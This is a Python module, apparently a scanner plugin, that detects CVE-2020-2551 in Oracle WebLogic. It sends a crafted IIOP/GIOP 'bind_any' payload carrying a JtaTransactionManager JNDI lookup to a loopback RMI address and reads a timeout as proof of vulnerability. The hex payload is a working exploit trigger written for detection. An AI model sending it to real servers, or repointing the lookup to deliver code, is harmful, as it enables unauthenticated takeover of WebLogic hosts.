"""Agent Asteroid implementation for CVE-2020-2551"""

import re
import socket
import struct


from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Unauthenticated RCE In Oracle WebLogic"
VULNERABILITY_REFERENCE = "CVE-2020-2551"
VULNERABILITY_DESCRIPTION = (
    "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: WLS Core Components). "
    "Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable "
    "vulnerability allows unauthenticated attacker with network access via IIOP to compromise Oracle WebLogic Server. "
    "Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server."
)
REFERENCES = {
    "xz.aliyun.com": "https://xz.aliyun.com/t/7374",
    "www.anquanke.com": "https://www.anquanke.com/post/id/197605",
    "github.com": "https://github.com/Dido1960/Weblogic-CVE-2020-2551-To-Internet",
}
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 15
JRMP = b"rmi://127.0.0.1:49172/abc"  # ephemeral port
SIGNATURE_PATTERN = re.compile(
    b"(.*?)([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})(.*?)(BEA)", re.S
)


@exploits_registry.register
class CVE20202551Exploit(definitions.Exploit):
    """
    CVE-2020-2551: Unauthenticated RCE In Oracle WebLogic
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
    )

    def accept(self, target: definitions.Target) -> bool:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(DEFAULT_TIMEOUT)
        try:
            sock.connect((target.host, target.port))
            sock.sendall(
                b"\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00"
                b"\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65"
            )
            response = sock.recv(1024)
        except socket.error:
            return False

        return b"GIOP" in response

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(DEFAULT_TIMEOUT)
        try:
            sock.connect((target.host, target.port))
            sock.sendall(
                b"\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00"
                b"\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65"
            )
            response = sock.recv(1024)
        except socket.error:
            return []
        signature = SIGNATURE_PATTERN.match(response)
        if signature is None:
            return []
        key = signature.group(4)
        key_index = response.find(key) - 1
        key_address = response[key_index : key_index + 120]
        payload = (
            b"\x47\x49\x4f\x50\x01\x02\x00\x00\x00\x00\x03\x47\x00\x00"
            b"\x00\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78"
            + key_address
            + b"\x00\x00\x00\x09\x62\x69\x6e\x64\x5f\x61\x6e\x79\x00\x00"
            b"\x00\x00\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x1e"
            b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0f\x31\x36"
            b"\x39\x2e\x32\x35\x34\x2e\x31\x33\x32\x2e\x37\x32\x00\x00"
            b"\x74\xf2\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00"
            b"\x00\x00\x00\x01\x00\x20\x05\x01\x00\x01\x00\x00\x00\x06"
            b"\x00\x00\x00\xf8\x00\x00\x00\x00\x00\x00\x00\x28\x49\x44"
            b"\x4c\x3a\x6f\x6d\x67\x2e\x6f\x72\x67\x2f\x53\x65\x6e\x64"
            b"\x69\x6e\x67\x43\x6f\x6e\x74\x65\x78\x74\x2f\x43\x6f\x64"
            b"\x65\x42\x61\x73\x65\x3a\x31\x2e\x30\x00\x00\x00\x00\x01"
            b"\x00\x00\x00\x00\x00\x00\x00\xbc\x00\x01\x02\x00\x00\x00"
            b"\x00\x0f\x31\x36\x39\x2e\x32\x35\x34\x2e\x31\x33\x32\x2e"
            b"\x37\x32\x00\x00\x74\xf2\x00\x00\x00\x00\x00\x64\x00\x42"
            b"\x45\x41\x08\x01\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x28\x49\x44\x4c\x3a\x6f\x6d"
            b"\x67\x2e\x6f\x72\x67\x2f\x53\x65\x6e\x64\x69\x6e\x67\x43"
            b"\x6f\x6e\x74\x65\x78\x74\x2f\x43\x6f\x64\x65\x42\x61\x73"
            b"\x65\x3a\x31\x2e\x30\x00\x00\x00\x00\x03\x31\x32\x00\x00"
            b"\x00\x00\x00\x01\x42\x45\x41\x2a\x00\x00\x00\x10\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\xc3\x25\x80\xc0\x6f\x84\x56\xab"
            b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x2c\x00\x00"
            b"\x00\x00\x00\x01\x00\x20\x00\x00\x00\x03\x00\x01\x00\x20"
            b"\x00\x01\x00\x01\x05\x01\x00\x01\x00\x01\x01\x00\x00\x00"
            b"\x00\x03\x00\x01\x01\x00\x00\x01\x01\x09\x05\x01\x00\x01"
            b"\x00\x00\x00\x0f\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x42\x45"
            b"\x41\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x25\xf4\xe3\xc0\x00\x00\x00\x00\x42\x45"
            b"\x41\x00\x00\x00\x00\x04\x00\x0a\x03\x06\x00\x00\x00\x00"
            b"\x00\x00\x00\x01\x00\x00\x00\x04\x6e\x61\x6d\x65\x00\x00"
            b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x1c"
            b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            + b"\x7f\xff\xff\x02"
            + b"\x00\x00\x00\x74\x52\x4d\x49\x3a\x63\x6f\x6d\x2e\x62\x65"
            b"\x61\x2e\x63\x6f\x72\x65\x2e\x72\x65\x70\x61\x63\x6b\x61"
            b"\x67\x65\x64\x2e\x73\x70\x72\x69\x6e\x67\x66\x72\x61\x6d"
            b"\x65\x77\x6f\x72\x6b\x2e\x74\x72\x61\x6e\x73\x61\x63\x74"
            b"\x69\x6f\x6e\x2e\x6a\x74\x61\x2e\x4a\x74\x61\x54\x72\x61"
            b"\x6e\x73\x61\x63\x74\x69\x6f\x6e\x4d\x61\x6e\x61\x67\x65"
            b"\x72\x3a\x30\x44\x33\x30\x34\x38\x45\x30\x37\x42\x31\x44"
            b"\x33\x42\x37\x42\x3a\x34\x45\x46\x33\x45\x43\x46\x42\x42"
            b"\x36\x32\x38\x39\x38\x32\x46\x00\xff\xff\xff\xff\x00\x01"
            b"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00"
            b"\x00\x23\x49\x44\x4c\x3a\x6f\x6d\x67\x2e\x6f\x72\x67\x2f"
            b"\x43\x4f\x52\x42\x41\x2f\x57\x53\x74\x72\x69\x6e\x67\x56"
            b"\x61\x6c\x75\x65\x3a\x31\x2e\x30\x00\x00"
            + struct.pack("!i", len(JRMP) - 1)
            + JRMP
        )
        sock.sendall(payload)
        try:
            sock.recv(2048)
        except TimeoutError:
            # If the target is vulnerable, it'll try to lookup the address in JRMP
            # The port in that address is most likely closed, hence the request will timeout
            vulnerability = self.create_vulnerability(target)
            return [vulnerability]
        except socket.error:
            return []

        return []
